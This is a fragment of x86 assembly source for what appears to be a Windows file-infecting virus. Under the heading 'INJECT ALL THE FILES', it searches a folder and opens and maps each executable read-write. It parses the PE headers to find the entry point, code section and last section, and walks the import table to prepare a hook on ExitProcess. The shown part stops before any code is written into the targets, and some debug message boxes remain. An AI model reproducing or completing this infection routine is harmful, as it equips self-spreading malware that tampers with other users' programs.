; INJECT ALL THE FILES !
injectFiles:
PDELTA	FileData
PDELTA	SearchFolder
call	[DELTA pFindFirstFile]
cmp	eax, INVALID_HANDLE_VALUE
je	errorExit
mov	[DELTA HandleSearch], eax

; INJECT THE NEXT !
nextFileToInject:
; OPEN FILE
push	0
push	0
push	OPEN_EXISTING
push	0
push	0
mov	eax, GENERIC_READ
or	eax, GENERIC_WRITE
push	eax
PDELTA	FileData.cFileName
call	[DELTA pCreateFile]
cmp	eax, INVALID_HANDLE_VALUE
je	errorOpen
mov	[DELTA PeFile], eax

; CREATE_FILE_MAPPING
push	NULL
push	0
push	0
push	PAGE_READWRITE
push	NULL
PVDELTA	PeFile
call	[DELTA pCreateFileMapping]
cmp	eax, 0
je	errorCreateMapping
mov	[DELTA PeMapObject], eax

; MAP_VIEW_OF_FILE
push	0
push	0
push	0
mov	eax,	FILE_MAP_READ
or	eax,	FILE_MAP_WRITE
push	eax
PVDELTA	PeMapObject
call	[DELTA pMapViewOfFile]
cmp	eax, 0
je	errorMapFile
mov	[DELTA PeFileMap], eax
mov	ebx, eax

; CHECK MAGIC
cmp	word ptr [ebx], IMAGE_DOS_SIGNATURE
jne	errorInjecting


; CHECK IMAGE_NET_SIGNATURE
mov	ecx, ebx
add	ecx, 03Ch
mov	edx, ebx
add	edx, dword ptr [ecx]
mov	[DELTA PeNtHeader], edx
cmp	dword ptr [edx], IMAGE_NT_SIGNATURE
jne	errorInjecting

; GET OPTIONAL HEADER useless so far
mov	[DELTA PeOptionalHeader], edx
add	[DELTA PeOptionalHeader], 018h

; GET NUMBER SECTIONS
mov	eax, edx
add	eax, 6
mov	[DELTA PeSectionNb], eax
xor	ecx, ecx
mov	cx, word ptr[eax]

; GET ENTRY POINT
add	eax, 022h
mov	esi, [eax]
mov	[DELTA OldEntryPoint], esi

; GET IMAGE BASE
add	eax, 0Ch
mov	esi, [eax]
mov	[DELTA BaseImage], esi

; GET ALIGNMENT
add	eax, 04h
mov	esi, [eax]
mov	[DELTA SectionAlignment], esi
add	eax, 04h
mov	esi, [eax]
mov	[DELTA FileAlignment], esi

; GET IAT Info for Hooking
; Because when threading it will exit our main thread
mov	edi, edx
mov	ebx, [DELTA PeOptionalHeader]
add	ebx, 060h ; DataDirectory
mov	eax, IMAGE_DIRECTORY_ENTRY_IMPORT
mov	ecx, sizeof (IMAGE_DATA_DIRECTORY)
mul	ecx
add	ebx, eax
mov	ebx, [ebx] ; IMAGE_DIRECTORY_ENTRY_IMPORT IAT (VA)
mov	[DELTA OffsetIAT], 0


; LOOP SECTIONS HEADER
mov	esi, edi
add	esi, 0F8h
mov	[DELTA PeStartHeader], esi
mov	[DELTA LastSec], 0
Loop_SectionHeader:
; GET LAST SECTION & CODE SECTION
mov	eax, esi
add	eax, 0Ch
; CHECK IF SECTION IS ENTRY POINT (CODE) (Check if it's contained within section)
mov	edx, [eax]
cmp	edx, [DELTA OldEntryPoint]
jg	notSectionCode ; Entry point is greater
mov	edi, eax
add	edi, 04h ; Getting size of raw data
add	edx, [edi]
cmp	edx, [DELTA OldEntryPoint]
jl	notSectionCode ; Entry point is not in the section
mov	[DELTA CodeSecHeader], esi
notSectionCode:
; CHECK IF SECTION IS THE LAST ONE
cmp	[DELTA LastSec], eax
jg	keepLastSec
mov	[DELTA LastSecHeader], esi
mov	[DELTA LastSec], eax
keepLastSec:
; CHECK IF SECTION IS IAT
cmp	ebx, [eax]
jl	notIAT
cmp	ebx, edx
jg	notIAT
mov	edx, [eax]
add	eax, 08h
mov	eax, [eax]
sub	edx, eax
mov	[DELTA OffsetIAT], edx
notIAT:
add	esi, 028h ; Keep End Header Section
loop	Loop_SectionHeader


; IAT Hooking (ExitProcess)
; Check if valid
cmp	[DELTA OffsetIAT], 0
je	doNotHook
; Get IAT
mov	edi, ebx ; VA IAT
mov	eax, [DELTA OffsetIAT]
sub	edi, eax
mov	eax, [DELTA PeFileMap]
add	edi, eax ; IAT

; Iterate on all IAT Modules
iterateIAT:
mov	edx, edi
add	edx, 0Ch ; Dll Name
mov	edx, [edx] ; VA
cmp	edx, 0
je	doNotHook
add	edx, eax
mov	ecx, [DELTA OffsetIAT]
sub	edx, ecx

pusha
push	0
push	edx
push	edx
push	0
call	[DELTA pMessageBox]
popa

; Iterate on all Imported Functions
mov	edx, edi
mov	edx, [edx]
add	edx, eax
sub	edx, ecx
iterateFunc:
mov	ebx, [edx]
cmp	ebx, 0
je	endIterateFunc
add	ebx, eax
sub	ebx, ecx
add	ebx, 2 ; TODO - WHY !?

; pusha
; push	0
; push	ebx
; push	ebx
; push	0
; call	[DELTA pMessageBox]
; popa

add	edx, 4
jmp	iterateFunc

endIterateFunc:


add	edi, sizeof (IMAGE_IMPORT_DESCRIPTOR)
jmp	iterateIAT

doNotHook:
